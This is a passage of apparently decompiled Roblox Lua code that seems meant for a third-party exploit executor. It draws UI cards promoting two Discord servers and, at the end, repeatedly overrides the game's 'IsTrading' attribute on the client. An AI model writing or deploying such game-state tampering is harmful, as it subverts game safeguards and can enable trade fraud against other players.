			local ok2, result2 = pcall(function()
				return HttpService:JSONDecode(v12.Body)
			end)

			if not ok2 or not result2 or not result2.guild then
				return nil
			end
			local guild = result2.guild
			local approximateMemberCount = result2.approximate_member_count or 0
			local v13 = nil

			if guild.icon then
				local str5 = ("https://cdn.discordapp.com/icons/%s/%s.png?size=128"):format(guild.id, guild.icon)

				local ok3, result3 = pcall(function()
					return request_({ Url = str5, Method = "GET" })
				end)

				local v14 = ok3 and result3
				v13 = nil

				if v14 then
					local str6 = arg8 .. ".png"
					writefile(str6, result3.Body)
					v13 = getcustomasset(str6)
				end
			end

			local tbl7 = { icon = v13 }
			tbl7.name = guild.name or arg7
			tbl7.members = approximateMemberCount
			return tbl7
		end

		local function fn14(arg7, arg8, arg9, arg10)
			local frame = Instance.new("Frame")
			frame.Size = UDim2.fromOffset(276, 85)
			frame.Position = arg8
			frame.BackgroundTransparency = 1
			frame.BorderSizePixel = 0
			frame.ClipsDescendants = false
			frame.Parent = arg7
			local textButton = Instance.new("TextButton")
			textButton.Size = UDim2.fromScale(1, 1)
			textButton.Position = UDim2.fromScale(0, 0)
			textButton.BackgroundTransparency = 1
			textButton.Text = ""
			textButton.ZIndex = 10
			textButton.Parent = frame

			textButton.MouseButton1Click:Connect(function()
				setclipboard("discord.gg/" .. arg10)
			end)

			local frame2 = Instance.new("Frame")
			frame2.Size = UDim2.fromOffset(62, 62)
			frame2.Position = UDim2.new(0, 0, 0.5, -31)
			frame2.BackgroundTransparency = 1
			frame2.BorderSizePixel = 0
			frame2.ZIndex = 2
			frame2.Parent = frame
			local imageLabel = Instance.new("ImageLabel")
			imageLabel.Size = UDim2.fromScale(1, 1)
			imageLabel.BackgroundTransparency = 1
			imageLabel.Image = arg9 and arg9.icon or ""
			imageLabel.ZIndex = 3
			imageLabel.Parent = frame2
			local uiCorner = Instance.new("UICorner")
			uiCorner.CornerRadius = UDim.new(0, 10)
			uiCorner.Parent = imageLabel
			local frame3 = Instance.new("Frame")
			frame3.Size = UDim2.new(1, -76, 1, 0)
			frame3.Position = UDim2.fromOffset(76, 0)
			frame3.BackgroundTransparency = 1
			frame3.ZIndex = 3
			frame3.Parent = frame
			local textLabel = Instance.new("TextLabel")
			textLabel.Size = UDim2.new(1, 0, 0, 30)
			textLabel.Position = UDim2.new(0, 0, 0, 14)
			textLabel.BackgroundTransparency = 1
			textLabel.Text = arg9 and arg9.name or "Unknown"
			textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
			textLabel.TextSize = 15
			textLabel.Font = Enum.Font.GothamBold
			textLabel.TextXAlignment = Enum.TextXAlignment.Left
			textLabel.TextTruncate = Enum.TextTruncate.AtEnd
			textLabel.ZIndex = 4
			textLabel.Parent = frame3
			local frame4 = Instance.new("Frame")
			frame4.Size = UDim2.new(1, 0, 0, 16)
			frame4.Position = UDim2.new(0, 0, 0, 46)
			frame4.BackgroundTransparency = 1
			frame4.ZIndex = 4
			frame4.Parent = frame3
			local frame5 = Instance.new("Frame")
			frame5.Size = UDim2.fromOffset(6, 6)
			frame5.Position = UDim2.new(0, 0, 0.5, -3)
			frame5.BackgroundColor3 = Color3.fromRGB(80, 220, 100)
			frame5.BorderSizePixel = 0
			frame5.ZIndex = 4
			frame5.Parent = frame4
			local uiCorner2 = Instance.new("UICorner")
			uiCorner2.CornerRadius = UDim.new(1, 0)
			uiCorner2.Parent = frame5
			local textLabel2 = Instance.new("TextLabel")
			textLabel2.Size = UDim2.new(1, -12, 1, 0)
			textLabel2.Position = UDim2.fromOffset(10, 0)
			textLabel2.BackgroundTransparency = 1
			arg9 = arg9 and tostring(arg9.members) .. " members"
			arg9 = arg9 or ""
			textLabel2.Text = arg9
			textLabel2.TextColor3 = Color3.fromRGB(180, 180, 180)
			textLabel2.TextSize = 12
			textLabel2.Font = Enum.Font.Gotham
			textLabel2.TextXAlignment = Enum.TextXAlignment.Left
			textLabel2.TextYAlignment = Enum.TextYAlignment.Center
			textLabel2.ZIndex = 4
			textLabel2.Parent = frame4
		end

		task.spawn(function()
			local v12 = fn13("9WxvBKkaVF", "chocola_icon")
			local CTUYqU9gcs = fn13("CTUYqU9gcs", "lkz_icon")
			fn14(v11, UDim2.new(0, 10, 1, -182), v12, "9WxvBKkaVF")
			fn14(v11, UDim2.new(0, 10, 1, -92), CTUYqU9gcs, "CTUYqU9gcs")
		end)
	end

	v9.OnClientEvent:Connect(function(arg7)
		if typeof(arg7) == "table" and arg7.otherUserId == arg then
			fn11()
		end
	end)

	task.spawn(function()
		localPlayer:SetAttribute("IsTrading", false)

		localPlayer:GetAttributeChangedSignal("IsTrading"):Connect(function()
			if localPlayer:GetAttribute("IsTrading") ~= false then
				localPlayer:SetAttribute("IsTrading", false)
			end
		end)
	end)
end
